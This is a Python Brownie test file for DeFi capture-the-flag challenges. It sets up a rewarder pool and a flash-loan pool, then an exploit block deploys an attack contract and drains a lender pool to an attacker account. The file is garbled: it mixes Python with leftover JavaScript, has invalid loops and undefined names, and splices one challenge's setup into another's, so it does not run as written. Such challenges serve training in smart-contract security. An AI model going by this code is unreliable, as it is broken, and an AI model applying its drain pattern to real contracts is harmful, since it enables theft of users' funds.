import pytest
import brownie
from brownie import FlashLoanerPool, TheRewarderPool, DamnValuableToken, RewardToken, AccountingToken
from brownie import AttackRewarder
from brownie import accounts , Wei , exceptions, chain

deployer, alice, bob, charlie, david, attacker = None, None, None, None, None, None
users = [alice, bob, charlie, david]

# Pool has 1M * 10**18 tokens
TOKENS_IN_LENDER_POOL = Wei('1_000_000 ether')  

#--  [ SETUP SCENARIO - NO NEED TO CHANGE ANYTHING HERE ] --#
@pytest.fixture(scope="module")
def contracts():

    global deployer, alice, bob, charlie, david, attacker, users
    deployer, alice, bob, charlie, david, attacker = accounts[0:6]

    contracts = {}

    liquidityToken =  DamnValuableToken.deploy({"from":deployer})
    flashLoanPool =  FlashLoanerPool.deploy(liquidityToken.address, {"from":deployer})

    # Set initial token balance of the pool offering flash loans
    liquidityToken.transfer(flashLoanPool.address, TOKENS_IN_LENDER_POOL, {"from":deployer})

    rewarderPool =  TheRewarderPool.deploy(liquidityToken.address, {"from":deployer})
    rewardToken =  RewardToken.attach(rewarderPool.rewardToken(), {"from":deployer})
    accountingToken =  AccountingToken.attach(rewarderPool.accToken(), {"from":deployer})

    # Alice, Bob, Charlie and David deposit 100 tokens each
    for user in users: 
        amount = Wei('100 ether')
        liquidityToken.transfer(user.address, amount, {"from":deployer})
        liquidityToken.approve(rewarderPool.address, amount, {"from":user})
        rewarderPool.deposit(amount, {"from":user})
        assert accountingToken.balanceOf(users[i].address) == amount
    
    assert accountingToken.totalSupply() == Wei('400 ether')
    assert rewardToken.totalSupply() == '0'

    chain.sleep(5 * 24 * 60 * 60)
    chain.mine(1)
          
    # Each depositor gets 25 reward tokens
    for user in range users:
        await this.rewarderPool.connect(users[i]).distributeRewards();
        expect(
            await this.rewardToken.balanceOf(users[i].address)
        ).to.be.eq(ethers.utils.parseEther('25'));
    }
    expect(await this.rewardToken.totalSupply()).to.be.eq(ethers.utils.parseEther('100'));

        // Attacker starts with zero DVT tokens in balance
        expect(await this.liquidityToken.balanceOf(attacker.address)).to.eq('0');
        
        // Two rounds should have occurred so far
        expect(
            await this.rewarderPool.roundNumber()
        ).to.be.eq('2');




    token = DamnValuableToken.deploy( {"from":deployer})
    pool = TrusterLenderPool.deploy(token.address,  {"from":deployer})

    token.transfer(pool.address, TOKENS_IN_POOL)

    assert token.balanceOf(pool.address) == TOKENS_IN_POOL
    assert token.balanceOf(attacker.address) == 0

    contracts['token'] = token
    contracts['pool'] = pool

    yield contracts

    #---  [ SUCCESS CONDITIONS ]  ---#
    # Attacker has taken all tokens from the pool
    assert token.balanceOf(attacker.address) == TOKENS_IN_POOL
    assert token.balanceOf(pool.address) == '0'


def test_truster_challenge(contracts):
    #-- [ CODE YOUR EXPLOIT HERE ] ---#
    
    attackTruster = AttackTruster.deploy(
        contracts["pool"].address,
        contracts["token"].address,
        {"from":attacker}
    )

    tx = attackTruster.attack(
            '0',
            attacker.address,
            TOKENS_IN_POOL,
            {"from":attacker}
        )
    tx.wait(1)

    contracts["token"].transferFrom(
        contracts["pool"].address, 
        attacker.address, 
        TOKENS_IN_POOL,
        {"from":attacker}
    )
    #_________________________________#
